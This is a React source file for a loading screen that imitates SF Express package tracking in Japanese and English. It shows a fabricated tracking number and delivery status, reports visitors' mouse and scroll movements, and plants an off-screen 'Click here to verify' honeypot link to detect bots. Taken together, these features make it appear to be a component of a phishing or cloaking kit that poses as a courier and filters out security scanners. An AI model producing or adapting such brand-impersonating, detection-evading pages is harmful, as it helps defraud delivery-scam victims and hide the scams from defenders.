'use client'

import { useState, useEffect } from 'react'

interface LoadingScreenProps {
  duration: number
  language: string
  onComplete: () => void
  onBehaviorTracked: (data: any) => void
  onHoneypotTriggered: () => void
}

interface Translations {
  title: string
  subtitle: string
  packageUpdate: string
  tracking: string
  status: string
  estimatedDelivery: string
  inTransit: string
  loadingMap: string
  footer: string
}

export default function PackageDeliveryScreen({
  duration,
  language,
  onComplete,
  onBehaviorTracked,
  onHoneypotTriggered
}: LoadingScreenProps) {
  const [progress, setProgress] = useState(0)
  const [translations, setTranslations] = useState<Translations | null>(null)
  const [truckPosition, setTruckPosition] = useState(0)

  useEffect(() => {
    const fetchTranslations = async () => {
      try {
        const response = await fetch('/api/get-translations', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ template: 'packageDelivery' })
        })
        const data = await response.json()
        setTranslations(data.translations)
      } catch (error) {
        setTranslations({
          title: 'SF Express',
          subtitle: 'Package Tracking',
          packageUpdate: language === 'ja' ? '荷物追跡情報' : 'Package Status Update',
          tracking: language === 'ja' ? '追跡番号' : 'Tracking',
          status: language === 'ja' ? 'ステータス' : 'Status',
          estimatedDelivery: language === 'ja' ? '配達予定' : 'Estimated Delivery',
          inTransit: language === 'ja' ? '配送中' : 'In Transit',
          loadingMap: language === 'ja' ? '配達情報を読み込み中...' : 'Loading delivery map...',
          footer: language === 'ja' ? 'リアルタイム追跡' : 'Real-time Tracking'
        })
      }
    }
    fetchTranslations()
  }, [language])

  useEffect(() => {
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval)
          onComplete()
          return 100
        }
        return prev + (100 / (duration * 10))
      })
    }, 100)

    const truckInterval = setInterval(() => {
      setTruckPosition(prev => (prev + 2) % 100)
    }, 50)

    const trackMouse = (e: MouseEvent) => onBehaviorTracked({ type: 'mouse', x: e.clientX, y: e.clientY })
    const trackScroll = () => onBehaviorTracked({ type: 'scroll', y: window.scrollY })
    window.addEventListener('mousemove', trackMouse)
    window.addEventListener('scroll', trackScroll)

    const honeypot = document.createElement('a')
    honeypot.href = '#'
    honeypot.style.position = 'absolute'
    honeypot.style.left = '-9999px'
    honeypot.textContent = 'Click here to verify'
    honeypot.addEventListener('click', (e) => {
      e.preventDefault()
      onHoneypotTriggered()
    })
    document.body.appendChild(honeypot)

    return () => {
      clearInterval(interval)
      clearInterval(truckInterval)
      window.removeEventListener('mousemove', trackMouse)
      window.removeEventListener('scroll', trackScroll)
      honeypot.remove()
    }
  }, [duration, onComplete, onBehaviorTracked, onHoneypotTriggered])

  if (!translations) {
    return (
      <div style={{ minHeight: '100vh', background: 'linear-gradient(135deg, #DC2626 0%, #EF4444 100%)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <div style={{ width: '40px', height: '40px', border: '4px solid rgba(255,255,255,0.3)', borderTop: '4px solid white', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }} />
        <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
      </div>
    )
  }

  return (
    <div style={{
      minHeight: '100vh',
      background: 'linear-gradient(to bottom right, #F3F4F6, #E5E7EB)',
      display: 'flex',
      flexDirection: 'column',
      position: 'relative',
      overflow: 'hidden'
    }}>
      {/* SF Express Header */}
      <header style={{
        background: '#000',
        padding: '16px 0',
        boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
      }}>
        <div style={{
          maxWidth: '1200px',
          margin: '0 auto',
          padding: '0 24px',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
        }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
            <div style={{
              width: '40px',
              height: '40px',
              background: 'white',
              borderRadius: '50%',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              fontWeight: 'bold',
              fontSize: '18px',
              color: '#000',
            }}>
              SF
            </div>
            <span style={{ color: 'white', fontSize: '14px' }}>
              {language === 'ja' ? '順豊速運' : 'SF Express'}
            </span>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div style={{
        flex: 1,
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '40px 20px'
      }}>
        <div style={{
          position: 'relative',
          width: '100%',
          maxWidth: '1100px',
          display: 'grid',
          gridTemplateColumns: '1fr 1fr',
          gap: '60px',
          alignItems: 'center',
        }}>
          {/* Left Side - Warehouse Image */}
          <div style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
          }}>
            <img
              src="/images/sf-warehouse-bg.png"
              alt="SF Express Warehouse"
              style={{
                width: '100%',
                height: 'auto',
                maxWidth: '500px',
                filter: 'drop-shadow(0 20px 40px rgba(0,0,0,0.1))',
              }}
            />
          </div>

          {/* Right Side - Tracking Card */}
          <div style={{
            background: 'white',
            borderRadius: '20px',
            boxShadow: '0 20px 60px rgba(0,0,0,0.15)',
            padding: '50px 40px',
            animation: 'slideUp 0.5s ease-out'
          }}>
            {/* Package Icon with Bounce Animation */}
            <div style={{
              width: '100px',
              height: '100px',
              margin: '0 auto 30px',
              position: 'relative'
            }}>
              <div style={{
                width: '100%',
                height: '100%',
                background: 'linear-gradient(135deg, #DC2626 0%, #EF4444 100%)',
                borderRadius: '20px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                fontSize: '50px',
                boxShadow: '0 10px 30px rgba(220, 38, 38, 0.4)',
                animation: 'bounce 2s ease-in-out infinite'
              }}>
                📦
              </div>
              
              {/* Moving Truck on Track */}
              <div style={{
                position: 'absolute',
                bottom: '-25px',
                left: '0',
                right: '0',
                height: '3px',
                background: 'linear-gradient(90deg, #e2e8f0 0%, #cbd5e0 100%)',
                borderRadius: '2px'
              }}>
                <div style={{
                  position: 'absolute',
                  left: `${truckPosition}%`,
                  top: '-10px',
                  fontSize: '20px',
                  transition: 'left 0.05s linear'
                }}>
                  🚚
                </div>
              </div>
            </div>

            {/* Title */}
            <h1 style={{
              fontSize: '24px',
              fontWeight: '700',
              color: '#1F2937',
              marginBottom: '8px',
              textAlign: 'center',
              marginTop: '20px'
            }}>
              {translations.packageUpdate}
            </h1>

            <p style={{
              fontSize: '14px',
              color: '#6B7280',
              textAlign: 'center',
              marginBottom: '30px'
            }}>
              {language === 'ja' ? '荷物の配送状況を確認しています' : 'Checking package delivery status'}
            </p>

            {/* Package Info */}
            <div style={{
              background: 'linear-gradient(135deg, #F9FAFB 0%, #F3F4F6 100%)',
              borderRadius: '12px',
              padding: '20px',
              marginBottom: '25px',
              border: '1px solid #E5E7EB'
            }}>
              {[
                { label: translations.tracking, value: 'SF1234567890JP' },
                { label: translations.status, value: translations.inTransit, highlight: true },
                { label: translations.estimatedDelivery, value: language === 'ja' ? '本日 17:00' : 'Today, 5:00 PM' }
              ].map((item, i) => (
                <div
                  key={i}
                  style={{
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'center',
                    padding: '10px 0',
                    borderBottom: i < 2 ? '1px solid #E5E7EB' : 'none',
                    animation: `fadeIn 0.5s ease-out ${i * 0.1}s both`
                  }}
                >
                  <span style={{ fontSize: '13px', color: '#6B7280', fontWeight: '500' }}>{item.label}</span>
                  <span style={{
                    fontSize: '14px',
                    fontWeight: '700',
                    color: item.highlight ? '#DC2626' : '#1F2937',
                    animation: item.highlight ? 'pulse 2s ease-in-out infinite' : 'none'
                  }}>
                    {item.value}
                  </span>
                </div>
              ))}
            </div>

            {/* Progress Bar */}
            <div style={{ marginBottom: '15px' }}>
              <div style={{
                width: '100%',
                height: '6px',
                background: '#E5E7EB',
                borderRadius: '10px',
                overflow: 'hidden',
              }}>
                <div style={{
                  width: `${progress}%`,
                  height: '100%',
                  background: 'linear-gradient(90deg, #DC2626 0%, #EF4444 100%)',
                  transition: 'width 0.3s ease',
                  position: 'relative',
                  boxShadow: '0 0 10px rgba(220, 38, 38, 0.5)'
                }}>
                  <div style={{
                    position: 'absolute',
                    top: 0,
                    left: '-100%',
                    width: '100%',
                    height: '100%',
                    background: 'linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent)',
                    animation: 'shimmer 1.5s infinite'
                  }} />
                </div>
              </div>
              <div style={{
                display: 'flex',
                justifyContent: 'space-between',
                marginTop: '8px'
              }}>
                <span style={{ fontSize: '12px', color: '#6B7280' }}>{translations.loadingMap}</span>
                <span style={{ fontSize: '12px', color: '#DC2626', fontWeight: '700' }}>{Math.round(progress)}%</span>
              </div>
            </div>

            {/* Footer */}
            <div style={{
              marginTop: '25px',
              paddingTop: '20px',
              borderTop: '1px solid #E5E7EB',
              textAlign: 'center'
            }}>
              <span style={{ 
                fontSize: '12px', 
                color: '#9CA3AF',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '6px'
              }}>
                <span style={{ 
                  width: '8px', 
                  height: '8px', 
                  background: '#DC2626', 
                  borderRadius: '50%',
                  animation: 'pulse 2s ease-in-out infinite'
                }} />
                {translations.footer}
              </span>
            </div>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes shimmer { to { left: 100%; } }
        @keyframes fadeIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
        
        @media (max-width: 1024px) {
          div[style*="gridTemplateColumns"] {
            grid-template-columns: 1fr !important;
            gap: 30px !important;
          }
          img[alt="SF Express Warehouse"] {
            display: none !important;
          }
        }
      `}</style>
    </div>
  )
}
